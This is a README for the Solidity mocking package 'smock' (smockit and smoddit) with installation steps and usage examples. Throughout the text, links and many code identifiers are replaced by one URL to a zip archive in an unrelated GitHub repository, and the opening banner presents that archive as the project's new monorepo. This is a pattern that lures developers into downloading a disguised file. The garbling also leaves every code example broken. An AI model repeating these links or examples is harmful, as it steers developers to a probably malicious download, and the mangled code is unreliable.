**[DEPRECATED]** This repository is now deprecated in favour of the new development [monorepo](https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip).

# @eth-optimisim/smock

`smock` is a utility package that can generate mock Solidity contracts (for testing). `smock` hooks into a `ethereumjs-vm` instance so that mock contract functions can be written entirely in JavaScript. `smock` currently only supports [Hardhat](https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip), but will be extended to support other testing frameworks.

Some nice benefits of hooking in at the VM level:
* Don't need to deploy any special contracts just for mocking!
* All of the calls are synchronous.
* Perform arbitrary javascript logic within your return value (return a function).
* It sounds cool.

`smock` also contains `smoddit`, another utility that allows you to modify the internal storage of contracts. We've found this to be quite useful in cases where many interactions occur within a single contract (typically to save gas).

## Installation

You can easily install `smock` via `npm`:

```sh
npm install @eth-optimism/smock
```

Or via `yarn`:

```sh
yarn add @eth-optimism/smock
```

## Note on Using `smoddit`

`smoddit` requires access to the internal storage layout of your smart contracts. The Solidity compiler exposes this via the `storageLayout` flag, which you need to enable at your hardhat config.

Here's an example `https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip` that shows how to enable this compiler flag:

```typescript
// https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip
import { HardhatUserConfig } from 'hardhat/config'

const config: HardhatUserConfig = {
  ...,
  solidity: {
    version: '0.7.0',
    settings: {
      outputSelection: {
        "*": {
            "*": ["storageLayout"],
        },
      },
    }
  },
}

export default config
```

## Table of Contents
- [API](#api)
  * [Functions](#functions)
    + [`smockit`](#-smockit-)
      - [Import](#import)
      - [Signature](#signature)
    + [`smoddit`](#-smoddit-)
      - [Import](#import-1)
      - [Signature](#signature-1)
  * [Types](#types)
    + [`smockit`](#-smockit--1)
      - [`MockContract`](#-mockcontract-)
      - [`MockContractFunction`](#-mockcontractfunction-)
      - [`MockReturnValue`](#-mockreturnvalue-)
    + [`smoddit`](#-smoddit--1)
      - [`ModifiableContractFactory`](#-modifiablecontractfactory-)
      - [`ModifiableContract`](#-modifiablecontract-)
- [Examples (smockit)](#examples--smockit-)
  * [Via `https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip`](#via--etherscontract-)
  * [Asserting Call Count](#asserting-call-count)
  * [Asserting Call Data](#asserting-call-data)
  * [Returning (w/o Data)](#returning--w-o-data-)
  * [Returning a Struct](#returning-a-struct)
  * [Returning a Function](#returning-a-function)
  * [Returning a Function (w/ Arguments)](#returning-a-function--w--arguments-)
  * [Reverting (w/o Data)](#reverting--w-o-data-)
  * [Reverting (w/ Data)](#reverting--w--data-)
- [Examples (smoddit)](#examples--smoddit-)
  * [Creating a Modifiable Contract](#creating-a-modifiable-contract)
  * [Modifying a `uint256`](#modifying-a--uint256-)
  * [Modifying a Struct](#modifying-a-struct)
  * [Modifying a Mapping](#modifying-a-mapping)
  * [Modifying a Nested Mapping](#modifying-a-nested-mapping)

## API
### Functions
#### `smockit`
##### Import
```typescript
import { smockit } from '@eth-optimism/smock'
```

##### Signature
```typescript
const smockit = async (
  spec: ContractInterface | Contract | ContractFactory,
  opts: {
    provider?: any,
    address?: string,
  },
): Promise<MockContract>
```

#### `smoddit`
##### Import
```typescript
import { smoddit } from '@eth-optimism/smock'
```

##### Signature
```typescript
const smoddit = async (
  name: string,
  signer?: any
): Promise<ModifiableContractFactory>
```

### Types
#### `smockit`
##### `MockContract`
```typescript
interface MockContract extends Contract {
  smocked: {
    [functionName: string]: MockContractFunction
  }
}
```

##### `MockContractFunction`
```typescript
interface MockContractFunction {
  calls: string[]
  will: {
    return: {
      (): void
      with: (returnValue?: MockReturnValue) => void
    }
    revert: {
      (): void
      with: (revertValue?: string) => void
    }
    resolve: 'return' | 'revert'
  }
}
```

##### `MockReturnValue`
```typescript
export type MockReturnValue =
  | string
  | Object
  | any[]
  | ((https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip any[]) => MockReturnValue)
```

#### `smoddit`
##### `ModifiableContractFactory`
```typescript
interface ModifiableContractFactory extends ContractFactory {
  deploy: (https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip any[]) => Promise<ModifiableContract>
}
```

##### `ModifiableContract`
```typescript
interface ModifiableContract extends Contract {
  smodify: {
    put: (storage: any) => Promise<void>
  }
}
```

## Examples (smockit)

### Via `https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip`
```typescript
import { ethers } from 'hardhat'
import { smockit } from '@eth-optimism/smock'

const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

// Smockit!
const MyMockContract = await smockit(MyContract)

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('Some return value!')

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // 'Some return value!'
```

### Asserting Call Count
```typescript
import { ethers } from 'hardhat'
import { smockit } from '@eth-optimism/smock'

const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

const MyOtherContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyOtherContract')
const MyOtherContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

// Smockit!
const MyMockContract = await smockit(MyContract)

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('Some return value!')

// Assuming that https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip calls https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip
await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip) // 1
```

### Asserting Call Data
```typescript
import { ethers } from 'hardhat'
import { smockit } from '@eth-optimism/smock'

const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

const MyOtherContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyOtherContract')
const MyOtherContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

// Smockit!
const MyMockContract = await smockit(MyContract)

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('Some return value!')

// Assuming that https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip calls https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip with 'Hello World!'.
await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip[0]) // 'Hello World!'
```

### Returning (w/o Data)
```typescript
import { ethers } from 'hardhat'
import { smockit } from '@eth-optimism/smock'

const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

// Smockit!
const MyMockContract = await smockit(MyContract)

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // []
```

### Returning a Struct
```typescript
import { ethers } from 'hardhat'
import { smockit } from '@eth-optimism/smock'

const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

// Smockit!
const MyMockContract = await smockit(MyContract)

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip({
    valueA: 'Some value',
    valueB: 1234,
    valueC: true
})

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // ['Some value', 1234, true]
```

### Returning a Function
```typescript
import { ethers } from 'hardhat'
import { smockit } from '@eth-optimism/smock'

const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

// Smockit!
const MyMockContract = await smockit(MyContract)

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(() => {
  return 'Some return value!'
})

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // ['Some return value!']
```

### Returning a Function (w/ Arguments)
```typescript
import { ethers } from 'hardhat'
import { smockit } from '@eth-optimism/smock'

const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

// Smockit!
const MyMockContract = await smockit(MyContract)

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip((myFunctionArgument: string) => {
  return myFunctionArgument
})

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('Some return value!')) // ['Some return value!']
```

### Reverting (w/o Data)
```typescript
import { ethers } from 'hardhat'
import { smockit } from '@eth-optimism/smock'

const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

// Smockit!
const MyMockContract = await smockit(MyContract)

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // Revert!
```

### Reverting (w/ Data)
```typescript
import { ethers } from 'hardhat'
import { smockit } from '@eth-optimism/smock'

const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

// Smockit!
const MyMockContract = await smockit(MyContract)

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('0x1234')

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('Some return value!')) // Revert!
```

## Examples (smoddit)

### Creating a Modifiable Contract
```typescript
import { ethers } from 'hardhat'
import { smoddit } from '@eth-optimism/smock'

// Smoddit!
const MyModifiableContractFactory = await smoddit('MyContract')
const MyModifiableContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
```

### Modifying a `uint256`
```typescript
import { ethers } from 'hardhat'
import { smoddit } from '@eth-optimism/smock'

// Smoddit!
const MyModifiableContractFactory = await smoddit('MyContract')
const MyModifiableContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip({
  myInternalUint256: 1234
})

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // 1234
```

### Modifying a Struct
```typescript
import { ethers } from 'hardhat'
import { smoddit } from '@eth-optimism/smock'

// Smoddit!
const MyModifiableContractFactory = await smoddit('MyContract')
const MyModifiableContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip({
  myInternalStruct: {
    valueA: 1234,
    valueB: true
  }
})

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // { valueA: 1234, valueB: true }
```

### Modifying a Mapping
```typescript
import { ethers } from 'hardhat'
import { smoddit } from '@eth-optimism/smock'

// Smoddit!
const MyModifiableContractFactory = await smoddit('MyContract')
const MyModifiableContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip({
  myInternalMapping: {
    1234: 5678
  }
})

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(1234)) // 5678
```

### Modifying a Nested Mapping
```typescript
import { ethers } from 'hardhat'
import { smoddit } from '@eth-optimism/smock'

// Smoddit!
const MyModifiableContractFactory = await smoddit('MyContract')
const MyModifiableContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)

await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip({
  myInternalNestedMapping: {
    1234: {
      4321: 5678
    }
  }
})

https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(1234, 4321)) // 5678
```
